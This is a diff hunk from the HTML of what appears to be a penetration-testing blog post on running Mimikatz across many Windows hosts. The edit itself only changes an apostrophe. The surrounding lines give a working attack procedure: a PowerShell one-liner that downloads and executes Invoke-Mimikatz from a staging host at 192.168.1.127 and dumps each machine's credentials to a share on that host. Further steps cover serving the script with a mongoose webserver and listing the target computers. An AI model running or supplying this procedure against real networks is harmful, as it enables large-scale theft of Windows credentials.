@@ -151,7 +151,7 @@ HKLM\System\CurrentControlSet\Contol\Lsa &quot;EveryoneIncludesAnonymous&quot; =
 <p>Step 4. Upload powershell script <a href="https://raw.github.com/mubix/post-exploitation/master/scripts/mass_mimikatz/powermeup.cmd">powermeup.cmd</a> - this script will run our hosted Invoke-Mimikatz script on each host:</p>
 <pre><code>powershell &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.127:8080/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds &gt; \\192.168.1.127\open\%COMPUTERNAME%.txt 2&gt;&amp;1
 </code></pre>
-<p>Step 5. Upload <a href="http://clymb3r.wordpress.com/">clymb3r</a>&lsquo;s Invoke-Mimikatz ps1 - Download from <a href="https://github.com/mattifestation/PowerSploit">PowerSploit</a> repo: <a href="https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1">source on github</a></p>
+<p>Step 5. Upload <a href="http://clymb3r.wordpress.com/">clymb3r</a>&rsquo;s Invoke-Mimikatz ps1 - Download from <a href="https://github.com/mattifestation/PowerSploit">PowerSploit</a> repo: <a href="https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1">source on github</a></p>
 <p>Step 6. Upload mongoose: <a href="http://cesanta.com/downloads.html">Downloads Page</a> - Both regular and tiny versions work. This is an awesome, single executable webserver that supports LUA, Sqlite, and WebDAV out of the box. Tiny version is under 100k.</p>
 <p>Step 7. Upload serverlist.txt - This is a line by line list of computer names to use mimikatz on. You&rsquo;ll have to gather this one way or another.</p>
 <p>Step 8. Execute mongoose (from directory with mimikatz.ps1) - This will start a listener with directory listings enabled on port 8080 by default</p>
